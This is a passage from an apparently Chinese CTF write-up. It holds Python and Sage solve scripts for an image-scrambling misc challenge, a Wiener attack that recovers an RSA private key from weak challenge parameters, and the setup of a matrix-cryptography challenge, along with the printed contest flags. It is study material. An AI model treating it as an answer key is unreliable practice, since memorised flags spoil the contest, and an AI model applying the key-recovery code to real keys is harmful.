    <span class="k">return</span> <span class="n">blocks</span><span class="p">,</span> <span class="n">img</span><span class="o">.</span><span class="n">size</span>


<span class="k">def</span> <span class="nf">split_8x8_into_4x4</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
    <span class="c1"># 将 8x8 矩阵分成 4 个 4x4 子矩阵</span>
    <span class="n">sub_blocks</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">block</span><span class="o">.</span><span class="n">crop</span><span class="p">((</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">)),</span>  <span class="c1"># 左上</span>
        <span class="n">block</span><span class="o">.</span><span class="n">crop</span><span class="p">((</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">)),</span>  <span class="c1"># 右上</span>
        <span class="n">block</span><span class="o">.</span><span class="n">crop</span><span class="p">((</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">)),</span>  <span class="c1"># 左下</span>
        <span class="n">block</span><span class="o">.</span><span class="n">crop</span><span class="p">((</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>  <span class="c1"># 右下</span>
    <span class="p">]</span>
    <span class="k">return</span> <span class="n">sub_blocks</span>


<span class="k">def</span> <span class="nf">swap_top_right_bottom_left</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">):</span>
    <span class="c1"># 交换右上和左下的子矩阵</span>
    <span class="n">sub_blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sub_blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">sub_blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sub_blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">sub_blocks</span>


<span class="k">def</span> <span class="nf">merge_4x4_into_8x8</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">):</span>
    <span class="c1"># 将 4 个 4x4 子矩阵合并成一个 8x8 矩阵</span>
    <span class="n">new_block</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">"RGB"</span><span class="p">,</span> <span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
    <span class="n">new_block</span><span class="o">.</span><span class="n">paste</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># 左上</span>
    <span class="n">new_block</span><span class="o">.</span><span class="n">paste</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># 右上</span>
    <span class="n">new_block</span><span class="o">.</span><span class="n">paste</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>  <span class="c1"># 左下</span>
    <span class="n">new_block</span><span class="o">.</span><span class="n">paste</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span>  <span class="c1"># 右下</span>
    <span class="k">return</span> <span class="n">new_block</span>


<span class="k">def</span> <span class="nf">save_processed_image</span><span class="p">(</span><span class="n">blocks</span><span class="p">,</span> <span class="n">original_size</span><span class="p">,</span> <span class="n">output_path</span><span class="p">):</span>
    <span class="c1"># 将处理后的块重新组合成图片</span>
    <span class="n">new_img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">"RGB"</span><span class="p">,</span> <span class="n">original_size</span><span class="p">)</span>
    <span class="n">block_index</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">original_size</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">8</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">original_size</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">8</span><span class="p">):</span>
            <span class="n">new_img</span><span class="o">.</span><span class="n">paste</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="n">block_index</span><span class="p">],</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
            <span class="n">block_index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="c1"># 保存结果</span>
    <span class="n">new_img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">output_path</span><span class="p">)</span>


<span class="c1"># 主函数</span>
<span class="k">def</span> <span class="nf">process_image</span><span class="p">(</span><span class="n">image_path</span><span class="p">,</span> <span class="n">output_path</span><span class="p">):</span>
    <span class="c1"># 1. 分割图片为 8x8 矩阵</span>
    <span class="n">blocks</span><span class="p">,</span> <span class="n">original_size</span> <span class="o">=</span> <span class="n">split_image_into_8x8_blocks</span><span class="p">(</span><span class="n">image_path</span><span class="p">)</span>

    <span class="c1"># 2. 处理每个 8x8 矩阵</span>
    <span class="n">processed_blocks</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">block</span> <span class="ow">in</span> <span class="n">blocks</span><span class="p">:</span>
        <span class="c1"># 2.1 将 8x8 矩阵分成 4x4 子矩阵</span>
        <span class="n">sub_blocks</span> <span class="o">=</span> <span class="n">split_8x8_into_4x4</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>

        <span class="c1"># 2.2 交换右上和左下的子矩阵</span>
        <span class="n">sub_blocks</span> <span class="o">=</span> <span class="n">swap_top_right_bottom_left</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">)</span>

        <span class="c1"># 2.3 将 4x4 子矩阵合并成 8x8 矩阵</span>
        <span class="n">new_block</span> <span class="o">=</span> <span class="n">merge_4x4_into_8x8</span><span class="p">(</span><span class="n">sub_blocks</span><span class="p">)</span>

        <span class="c1"># 2.4 保存处理后的块</span>
        <span class="n">processed_blocks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_block</span><span class="p">)</span>

    <span class="c1"># 3. 保存结果</span>
    <span class="n">save_processed_image</span><span class="p">(</span><span class="n">processed_blocks</span><span class="p">,</span> <span class="n">original_size</span><span class="p">,</span> <span class="n">output_path</span><span class="p">)</span>


<span class="c1"># 示例调用</span>
<span class="n">image_path</span> <span class="o">=</span> <span class="s2">"PixMatrix.jpg"</span>  <span class="c1"># 替换为你的图片路径</span>
<span class="n">output_path</span> <span class="o">=</span> <span class="s2">"processed_image.jpg"</span>  <span class="c1"># 保存处理后的图片路径</span>
<span class="n">process_image</span><span class="p">(</span><span class="n">image_path</span><span class="p">,</span> <span class="n">output_path</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"处理完成，结果已保存到 {output_path}"</span><span class="p">)</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776218346-ad7d2713-1330-418b-b29a-936207ee7683.png"/></p>
<p>DASCTF{824f1e986260efa86f1bd252b5e13a4d)</p>
<p></p>
<h3 data-content="1" id="eac2f1b2f34f9f1f95b2cb0bc50edff3">Crypto</h3>
<p></p>
<h3 data-content="1" id="cfdd0c718e7087e2671a504f569dcc7b">ddd</h3>
<pre><code>https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#Crypto</code></pre>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="kn">import</span> <span class="nn">libnum</span>

<span class="k">def</span> <span class="nf">continuedFra</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
    <span class="sd">"""计算连分数</span>
<span class="sd">    :param x: 分子</span>
<span class="sd">    :param y: 分母</span>
<span class="sd">    :return: 连分数列表</span>
<span class="sd">    """</span>
    <span class="n">cf</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">while</span> <span class="n">y</span><span class="p">:</span>
        <span class="n">cf</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">x</span> <span class="o">//</span> <span class="n">y</span><span class="p">)</span>
        <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">%</span> <span class="n">y</span>
    <span class="k">return</span> <span class="n">cf</span>
<span class="k">def</span> <span class="nf">gradualFra</span><span class="p">(</span><span class="n">cf</span><span class="p">):</span>
    <span class="sd">"""计算传入列表最后的渐进分数</span>
<span class="sd">    :param cf: 连分数列表</span>
<span class="sd">    :return: 该列表最后的渐近分数</span>
<span class="sd">    """</span>
    <span class="n">numerator</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">denominator</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">cf</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
        <span class="c1"># 这里的渐进分数分子分母要分开</span>
        <span class="n">numerator</span><span class="p">,</span> <span class="n">denominator</span> <span class="o">=</span> <span class="n">denominator</span><span class="p">,</span> <span class="n">x</span> <span class="o">*</span> <span class="n">denominator</span> <span class="o">+</span> <span class="n">numerator</span>
    <span class="k">return</span> <span class="n">numerator</span><span class="p">,</span> <span class="n">denominator</span>
<span class="k">def</span> <span class="nf">solve_pq</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
    <span class="sd">"""使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span>
<span class="sd">    :param a:x^2的系数</span>
<span class="sd">    :param b:x的系数</span>
<span class="sd">    :param c:pq</span>
<span class="sd">    :return:p，q</span>
<span class="sd">    """</span>
    <span class="n">par</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">isqrt</span><span class="p">(</span><span class="n">b</span> <span class="o">*</span> <span class="n">b</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">a</span> <span class="o">*</span> <span class="n">c</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span> <span class="o">+</span> <span class="n">par</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span><span class="p">),</span> <span class="p">(</span><span class="o">-</span><span class="n">b</span> <span class="o">-</span> <span class="n">par</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">getGradualFra</span><span class="p">(</span><span class="n">cf</span><span class="p">):</span>
    <span class="sd">"""计算列表所有的渐近分数</span>
<span class="sd">    :param cf: 连分数列表</span>
<span class="sd">    :return: 该列表所有的渐近分数</span>
<span class="sd">    """</span>
    <span class="n">gf</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">gf</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">gradualFra</span><span class="p">(</span><span class="n">cf</span><span class="p">[:</span><span class="n">i</span><span class="p">]))</span>
    <span class="k">return</span> <span class="n">gf</span>


<span class="k">def</span> <span class="nf">wienerAttack</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="sd">"""</span>
<span class="sd">    :param e:</span>
<span class="sd">    :param n:</span>
<span class="sd">    :return: 私钥d</span>
<span class="sd">    """</span>
    <span class="n">cf</span> <span class="o">=</span> <span class="n">continuedFra</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="n">gf</span> <span class="o">=</span> <span class="n">getGradualFra</span><span class="p">(</span><span class="n">cf</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">d</span><span class="p">,</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">gf</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">k</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">continue</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">e</span> <span class="o">*</span> <span class="n">d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="n">k</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">continue</span>
        <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">e</span> <span class="o">*</span> <span class="n">d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="n">k</span>
        <span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">solve_pq</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span> <span class="o">-</span> <span class="n">phi</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">d</span>

<span class="n">n</span> <span class="o">=</span> <span class="mi">114566998957451783636756389276471274690612644037126335470456866443567982817002189902938330449132444558501556339080521014838959058380963759366933946623103869574657553262938223064086322963492884606713973124514306815995276393344755433548846003574038937940253826360659447735554684257197194046341849089254659225497</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">35489734227210930185586918984451799765619374486784192218215354633053183935617953856556709715097294481614236703293033675674496036691242573294182072757562322996800390363453350727372642264982749305833933966045097125311467413670410802534093354414115267442785896373815076066721029449240889291057288090241124904705</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">60503455347700500866544596012233537789678841391057706123172519773588895502922586197178148979273264437566411675346207472455036341903878112074983509557751805365618433536738111588239911292341288514123006967218545943520736254346030465088445419278775539026233686559207400401082452551955780877227801939191694370380</span>
<span class="n">d</span><span class="o">=</span><span class="n">wienerAttack</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
<span class="n">m</span><span class="o">=</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="n">m</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</pre></div>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32674752/1734776218509-94838c2a-1cc2-4d11-9c88-21b7d7d26990.png"/></p>
<p>DASCTF{e694f0b4e9556021d1bc9e8deedba575}</p>
<h3 data-content="1" id="86d0a521547107eba508daeeeaa006b5">QAQTAT</h3>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>

<span class="k">def</span> <span class="nf">enc</span><span class="p">(</span><span class="n">pt</span><span class="p">,</span> <span class="n">G</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">T</span><span class="p">,</span> <span class="n">S</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">D</span> <span class="o">=</span> <span class="n">G</span><span class="o">^</span><span class="n">s</span>
    <span class="n">E</span> <span class="o">=</span> <span class="n">A</span><span class="o">*</span><span class="n">T</span><span class="o">*</span><span class="n">A</span>
    <span class="n">F</span> <span class="o">=</span> <span class="n">D</span><span class="o">*</span><span class="n">E</span><span class="o">*</span><span class="n">D</span>
    <span class="n">K</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">D</span><span class="o">*</span><span class="n">S</span><span class="o">*</span><span class="n">D</span><span class="p">)</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">K</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">+</span><span class="nb">sum</span><span class="p">(</span><span class="n">K</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="nb">sum</span><span class="p">(</span><span class="n">K</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">mask</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">ct</span> <span class="o">=</span> <span class="n">pt</span> <span class="o">^^</span> <span class="n">mask</span>
    <span class="k">return</span> <span class="n">ct</span><span class="p">,</span> <span class="n">F</span>

<span class="n">p</span> <span class="o">=</span>  <span class="mi">72887242108660141996862343556330151015969690949835567252527194788428065480383</span>
<span class="n">Fp2</span><span class="o">.&lt;</span><span class="n">i</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="o">^</span><span class="mi">2</span><span class="p">,</span> <span class="n">modulus</span><span class="o">=</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="n">M</span> <span class="o">=</span> <span class="n">MatrixSpace</span><span class="p">(</span><span class="n">Fp2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>

<span class="n">pk</span> <span class="o">=</span>  <span class="p">([(</span><span class="mi">17721183402259872020800275954210023274983052570120081248291897425608931477093</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">32398110280895896734010284949974832063887503132353681078977206899204202173789</span><span class="p">,</span> <span class="mi">54531634495057046991515273558305428867102201405617856305008554208336946545276</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">53559176432820530464958340934397135653021175198597495321065224929188410347695</span><span class="p">,</span> <span class="mi">27719945502856754481236098196014205483081586087367078493933408080194499938927</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1450628736387393873166171805424299538505476789523674611289973478290718453200</span><span class="p">),</span> <span class="p">(</span><span class="mi">57242423786686483363839647362581564383925732392730073374546590355998555747077</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">573726326354574516128249317235875704460857319673337707555095009277545125755</span><span class="p">,</span> <span class="mi">33631043256657770245013631632455702904903259491780484310654749784948198388976</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">17344746653834202604930860577508757708688427949046279718508635007113840369042</span><span class="p">,</span> <span class="mi">37771390186920740637371383242878514021347606565375600086363978842439775164973</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">60264754185911116825495147907207494752330900415794996812483089251259003404228</span><span class="p">),</span> <span class="p">(</span><span class="mi">1163730453993018743008743150834548760986076138562570206571825145859591284352</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">69245390362211526197537288211735612650619880945856387683074182933575799994162</span><span class="p">,</span> <span class="mi">11137807706588795799057940108843238078078690609437386007163034291855328303661</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">50795522649623533714787572047531722836395032085224035511036953078383612475598</span><span class="p">,</span> <span class="mi">14354786571703727534706086386589187674076604263117377684131521866407943036307</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">63028649680815097939155846824928638616844025040257105384123424769274942520895</span><span class="p">)],</span> <span class="p">[(</span><span class="mi">22137116252880790433838296157765927318220905592359967466680754349755815464341</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">35503968364379821899511866562472775961434113516937033217642581531414863539290</span><span class="p">,</span> <span class="mi">38346074307552448152239080224505166810289185210503265380269711384969731945517</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">9333819647786551924409858116441570177115099865486742684028611902450000042407</span><span class="p">,</span> <span class="mi">24608192510515673607042276468532809071945836783394960695059783085937608049755</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">27099766371861599260580052331632986107092105438254563604629919595057370886149</span><span class="p">),</span> <span class="p">(</span><span class="mi">57539731529782952718529369617033412770127782205874818027724894673104814770991</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12431864123786174601413168140961685219607645783666490625760143190724674574386</span><span class="p">,</span> <span class="mi">33510082449726132893492104159133966168598115972734064630878005553829725389082</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">30594711977745700371548334707069524826346332947574826081979927125841475148328</span><span class="p">,</span> <span class="mi">8911862104171403632946802970568635607253840071000107875759139060453368618583</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">51594672749496705581452789883241278156858476777167382827032876227546058970732</span><span class="p">),</span> <span class="p">(</span><span class="mi">58105830161247358431125768499050987088161417325586965601350797391396603985470</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">10949064084676782939947256128733523229613253182051362970560478801614590446300</span><span class="p">,</span> <span class="mi">6665352489343222248969975791152178151760060704226637217535985452272551528693</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16163109497937280055564868323730465088174193174761590036929535644203224067166</span><span class="p">,</span> <span class="mi">26147088265849488467397913386934580340556987670869413865359802108333761377560</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">14170094609019059182842713618319151553137248441974849089555832123638494739417</span><span class="p">)],</span> <span class="p">[(</span><span class="mi">60066006389024369318961505483331049048095679333675437984483948643792214278503</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">67617085525047580942273623886038114942547589259839196477555874755427651308048</span><span class="p">,</span> <span class="mi">38692305959834079988532869421062338838072016075793686080934562521314366274998</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">21104829450473981189549299039898127784065322316764325995863199136802573514</span><span class="p">,</span> <span class="mi">7207625628360021282792621977024027446511231977201394776410095364976996279450</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">23039079766688651678553952766794875180844089420934577132338235904018762773928</span><span class="p">),</span> <span class="p">(</span><span class="mi">10808368042897084491009063074724200907600038030639153659288985642861405920614</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">33955795465220353002933680692690511153845418737513482128237117905262919879043</span><span class="p">,</span> <span class="mi">21645210772494061734726430463955231707074915293749580279327741388687068110310</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">62225984739450865202997071369617271241348810092608626482294704825641320606694</span><span class="p">,</span> <span class="mi">14572118842071162051223076904993643512402905544627821044103215186921277812496</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">63504547636870837320642724540312613748726280369811190421219651308407770510674</span><span class="p">),</span> <span class="p">(</span><span class="mi">6529211642735966744323364626486352288002532267939478445216264742350974653419</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">43426895500365913698127867498420593427453574994051597107529725996420257433857</span><span class="p">,</span> <span class="mi">66636149494607064863031794353485502915121295051850619450321561966293398587284</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">51049172134567530748763269555600518661288880531459625871071308764595168859033</span><span class="p">,</span> <span class="mi">42297258788816007263333796194491196601979606573843177791726417124128570106777</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">45527674821983322767637713856131638914194577467349514130179266972864796164733</span><span class="p">)],</span> <span class="p">[(</span><span class="mi">47645610858583239528541540288030905132801730740336899517917521534427703920375</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">13272393664089987551368548207128885229248289454405159277755757369580866096516</span><span class="p">,</span> <span class="mi">60503024931869977830369448001966194434192750710631225090391559259672930497207</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">22742672333325631628906219543935772962495637869131049729874762344108069789046</span><span class="p">,</span> <span class="mi">18239371575343144081671835175136676417172797381923442300525086630600561560114</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">53605095942301227312866863441233162082087535371838738595931070092230378325532</span><span class="p">),</span> <span class="p">(</span><span class="mi">49652795839344946948771531270341537200526957150620826334216871981974859849848</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">72788891932812016325514298655742330969740202920835574638161526839627026310392</span><span class="p">,</span> <span class="mi">58465406030985457122487065262985150103086610852826560192123766406670919681919</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">41631921368744416558173670147590406285376603436284660888096365325833457519047</span><span class="p">,</span> <span class="mi">2867068797023070369258694926242485369317317985428997150826022662547346928319</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">199536555238705400453079146297641296197748614855192340202929119323998667173</span><span class="p">),</span> <span class="p">(</span><span class="mi">19319782936524636558881137449470396788888469756320580071801690941326971557928</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">34694728896207512382372151140975478616355941017631874070450334268575015485538</span><span class="p">,</span> <span class="mi">60420266086997924618637147844041161464210208935194926422677077391866663978425</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">13672363312837218411993834816309940812825734002380106434784905443915361955247</span><span class="p">,</span> <span class="mi">56317025568717741728727542740124505299029374963112095990350877412868385510001</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">56960621295573230601502052571104746367180500789238336757504091383665514782189</span><span class="p">)])</span>
<span class="n">F</span> <span class="o">=</span>  <span class="p">[(</span><span class="mi">36081831373398765496490121898118275331597167308301671911642273861563666664545</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">20818485079783326431414952124332440995164298376805349071762867760925654560129</span><span class="p">,</span> <span class="mi">2080527476644284459469754065728582261439110792635520661740429151724797376184</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">22485923248080983391383279592637691489160934672854638306617785344436031827838</span><span class="p">,</span> <span class="mi">15544373162545014827602222261755865080947187122261471926061663568794038512828</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">65994932829738499994169748656063604384011854387402875895186473718226656419067</span><span class="p">),</span> <span class="p">(</span><span class="mi">3553534440103543686958858303956716887328727627636404431097647427819509340361</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">41182149981825439188243414995474733005799065992663037326956422731949977723727</span><span class="p">,</span> <span class="mi">11444151159046255413538671703716370245288291793592500278345001664024824339590</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1802783416049323926195923226865768221398255563865542946492803065162093093803</span><span class="p">,</span> <span class="mi">15739175840903697568714274177182938758189586472507039731239155962622285528109</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">38249065906628598713138583591858150126778794837077688369911160900556744463900</span><span class="p">),</span> <span class="p">(</span><span class="mi">14364753807737302773559096493138893453118094354943941768609481298414054855231</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16290236676179704559365899211744462983770375364688247022596145726641137243214</span><span class="p">,</span> <span class="mi">3863306473986430132042752882629555431418515741358351198972027547882636615940</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1209446834271293681961506708684952401569936830292701272655835127315444154958</span><span class="p">,</span> <span class="mi">21868026584808712490812183410257662299067350008298604021123682243508255905173</span><span class="o">*</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12828201007038003022201361213007595366913298546122923089499182187938898042596</span><span class="p">)]</span>
<span class="n">ct</span> <span class="o">=</span>  <span class="mi">96910798667771988374291172958072220832574586618080134344021393928577220469428</span>

<span class="n">A</span><span class="p">,</span> <span class="n">T</span><span class="p">,</span> <span class="n">S</span><span class="p">,</span> <span class="n">G</span> <span class="o">=</span> <span class="p">[</span><span class="n">M</span><span class="p">(</span><span class="n">ii</span><span class="p">)</span> <span class="k">for</span> <span class="n">ii</span> <span class="ow">in</span> <span class="n">pk</span><span class="p">]</span>
<span class="n">F</span> <span class="o">=</span> <span class="n">M</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>


